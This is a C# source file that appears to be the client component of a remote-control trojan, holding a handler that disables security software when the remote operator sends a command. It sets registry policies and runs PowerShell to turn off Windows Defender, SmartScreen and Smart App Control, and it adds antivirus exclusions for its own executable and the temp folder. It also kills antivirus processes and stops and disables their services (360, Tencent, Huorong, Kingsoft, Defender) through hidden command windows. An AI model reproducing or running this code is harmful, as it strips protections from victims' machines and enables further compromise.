using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestDisableDefenderHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                var resp = new ResponseDisableDefender();
                var sb = new System.Text.StringBuilder();
                try
                {
                    var req = reqObj as RequestDisableDefender;
                    int mode = req != null ? req.Mode : 0;

                    if (mode == 0 || mode == 1)
                    {
                        DisableDefenderRealtime(sb);
                        DisableSmartScreen(sb);
                        AddExclusions(sb);
                    }

                    if (mode == 0 || mode == 2)
                    {
                        KillSecurityProcesses(sb);
                        StopSecurityServices(sb);
                    }

                    if (mode == 0 || mode == 3)
                    {
                        AddExclusions(sb);
                    }

                    resp.Result = true;
                    resp.Message = "消盾操作完成";
                    resp.Detail = sb.ToString();
                }
                catch (Exception ex)
                {
                    resp.Result = false;
                    resp.Message = "消盾失败: " + ex.Message;
                    resp.Detail = sb.ToString() + "\n" + ex.StackTrace;
                }
                session.Send(ePacketType.PACKET_DISABLE_DEFENDER_RESPONSE, resp);
            });
        }

        private void DisableDefenderRealtime(System.Text.StringBuilder sb)
        {
            try
            {
                // 通过注册表关闭实时保护
                string regPath = @"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection";
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(regPath))
                {
                    if (key != null)
                    {
                        key.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
                        key.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
                        key.SetValue("DisableOnAccessProtection", 1, RegistryValueKind.DWord);
                        key.SetValue("DisableScanOnRealtimeEnable", 1, RegistryValueKind.DWord);
                        sb.AppendLine("[OK] Defender实时保护已通过注册表禁用");
                    }
                }

                // 禁用Defender本身
                string regPath2 = @"SOFTWARE\Policies\Microsoft\Windows Defender";
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(regPath2))
                {
                    if (key != null)
                    {
                        key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                        sb.AppendLine("[OK] Defender反间谍已禁用");
                    }
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine("[FAIL] 注册表禁用Defender: " + ex.Message);
            }

            // 通过PowerShell命令
            try
            {
                RunCmd("powershell", "-Command Set-MpPreference -DisableRealtimeMonitoring $true");
                sb.AppendLine("[OK] PowerShell禁用实时保护");
            }
            catch (Exception ex)
            {
                sb.AppendLine("[FAIL] PowerShell: " + ex.Message);
            }
        }

        private void DisableSmartScreen(System.Text.StringBuilder sb)
        {
            try
            {
                string regPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer";
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, true))
                {
                    if (key != null)
                    {
                        key.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
                        sb.AppendLine("[OK] SmartScreen已禁用");
                    }
                }

                // 关闭智能应用控制
                string sacPath = @"SYSTEM\CurrentControlSet\Control\CI\Policy";
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(sacPath, true))
                {
                    if (key != null)
                    {
                        key.SetValue("VerifiedAndReputablePolicyState", 0, RegistryValueKind.DWord);
                        sb.AppendLine("[OK] 智能应用控制已关闭");
                    }
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine("[FAIL] SmartScreen: " + ex.Message);
            }
        }

        private void AddExclusions(System.Text.StringBuilder sb)
        {
            try
            {
                string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                string exeDir = Path.GetDirectoryName(exePath);
                string tempDir = Path.GetTempPath();

                string cmd = string.Format(
                    "-Command \"Add-MpPreference -ExclusionPath '{0}'; Add-MpPreference -ExclusionPath '{1}'; Add-MpPreference -ExclusionProcess '{2}'\"",
                    exeDir, tempDir, exePath);
                RunCmd("powershell", cmd);
                sb.AppendLine("[OK] 排除路径已添加: " + exeDir);
            }
            catch (Exception ex)
            {
                sb.AppendLine("[FAIL] 排除路径: " + ex.Message);
            }
        }

        private void KillSecurityProcesses(System.Text.StringBuilder sb)
        {
            string[] targets = {
                "360tray", "360safe", "360sd", "zhudongfangyu",
                "qqpctray", "qqpcmgr",
                "hipstray", "wsctrl", "usysdiag",
                "kxetray", "kxescore", "kwsprotect",
                "msmpeng", "mpcmdrun",
                "sechealth", "securityhealthsystray"
            };

            foreach (string name in targets)
            {
                try
                {
                    Process[] procs = Process.GetProcessesByName(name);
                    foreach (Process p in procs)
                    {
                        p.Kill();
                        sb.AppendLine("[OK] 已终止: " + name);
                    }
                }
                catch { }
            }
        }

        private void StopSecurityServices(System.Text.StringBuilder sb)
        {
            string[] services = {
                "WinDefend", "WdNisSvc", "SecurityHealthService",
                "ZhuDongFangYu", "360rp",
                "QQPCMgr", "QQPCRTP",
                "HipsTray", "usysdiag"
            };

            foreach (string svc in services)
            {
                try
                {
                    RunCmd("net", "stop \"" + svc + "\" /y");
                    RunCmd("sc", "config \"" + svc + "\" start= disabled");
                    sb.AppendLine("[OK] 已停止服务: " + svc);
                }
                catch { }
            }
        }

        private void RunCmd(string file, string args)
        {
            ProcessStartInfo psi = new ProcessStartInfo(file, args);
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            if (p != null) p.WaitForExit(10000);
        }
    }
}
